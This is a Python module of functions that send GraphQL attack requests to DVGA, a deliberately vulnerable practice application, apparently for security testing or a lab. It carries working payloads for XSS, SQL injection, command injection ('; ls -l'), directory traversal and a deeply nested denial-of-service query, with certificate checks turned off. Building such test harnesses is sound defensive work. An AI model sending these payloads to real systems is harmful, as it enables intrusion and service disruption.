"""GraphQL library functions."""

import requests


def introspection_query(pub_ip, secure=False):
    """Introspection"""
    query = '''
    {
        __schema{
            types{
                name
            }
        }
    }
    '''
    if secure:
        req = requests.post('https://' + str(pub_ip) + '/graphql', json={'query': query}, verify=False)
    else:
        req = requests.post('http://' + str(pub_ip) + '/graphql', json={'query': query})
    if req.status_code != 200:
        return "not able to access DVGA application"
    return req.text


def cross_script_attack(pub_ip, secure=False):
    """XSS attack"""
    mutation = '''
    mutation {
          createPaste(title:"</script>", content:"hello", public:true) {
            paste{
                id
            }
        }
    }
    '''
    if secure:
        req = requests.post('https://' + str(pub_ip) + '/graphql', json={'query': mutation}, verify=False)
    else:
        req = requests.post('http://' + str(pub_ip) + '/graphql', json={'query': mutation})
    if req.status_code != 200:
        return "not able to access DVGA application"
    return req.text


def sql_injection_attack(pub_ip, secure=False):
    """sql-injection attack"""
    query = '''
    {
        systemDiagnostics(username:"' or 1=1 --" , password: "shubham@9", cmd: "ls -l")
    }
    '''
    if secure:
        req = requests.post('https://' + str(pub_ip) + '/graphql', json={'query': query}, verify=False)
    else:
        req = requests.post('http://' + str(pub_ip) + '/graphql', json={'query': query})
    if req.status_code != 200:
        return "not able to access DVGA application"
    return req.text


def command_execution_attack(pub_ip, secure=False):
    """Command execution attack"""
    mutation = '''
    mutation  {
          importPaste(host:"localhost", port:80, path:"/ ; ls -l", scheme:"http"){
            result
          }
    }
    '''
    if secure:
        req = requests.post('https://' + str(pub_ip) + '/graphql', json={'query': mutation}, verify=False)
    else:
        req = requests.post('http://' + str(pub_ip) + '/graphql', json={'query': mutation})
    if req.status_code != 200:
        return "not able to access DVGA application"
    return req.text


def directory_traversal_attack(pub_ip, secure=False):
    """Directory traversal attack"""
    mutation = '''
    mutation{
        uploadPaste(content:"hello", filename:"../../s_attack.txt"){
            result
        }
    }
    '''
    if secure:
        req = requests.post('https://' + str(pub_ip) + '/graphql', json={'query': mutation}, verify=False)
    else:
        req = requests.post('http://' + str(pub_ip) + '/graphql', json={'query': mutation})
    if req.status_code != 200:
        return "not able to access DVGA application"
    return req.text


def recursive_query_attack(pub_ip, secure=False):
    """Recursive query attack"""
    query = '''
    query {
        pastes {
            owner {
                paste {
                    edges {
                        node {
                            owner {
                                paste {
                                    edges {
                                        node {
                                            owner {
                                                paste
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    '''
    if secure:
        req = requests.post('https://' + str(pub_ip) + '/graphql', json={'query': query}, verify=False)
    else:
        req = requests.post('http://' + str(pub_ip) + '/graphql', json={'query': query})
    return req.text


def get_info(pub_ip, secure=False):
    query = '''
    {
    __type(name: "Query") {
        name
        fields {
        name
        type {
            name
            kind
        }
        }
    }
    }
    '''
    if secure:
        req = requests.get('https://' + str(pub_ip) + '/graphql', json={'query': query}, verify=False)
    else:
        req = requests.get('http://' + str(pub_ip) + '/graphql', json={'query': query})
    if req.status_code != 200:
        return "not able to access DVGA application"
    return req.text


def malformed_req(pub_ip, secure=False):
    query = '''
    {
    __type(name: "Query") {
        groupID
        }
    }
    '''
    if secure:
        req = requests.get('https://' + str(pub_ip) + '/graphql', json={'query': query}, verify=False)
    else:
        req = requests.get('http://' + str(pub_ip) + '/graphql', json={'query': query})
    return req.text
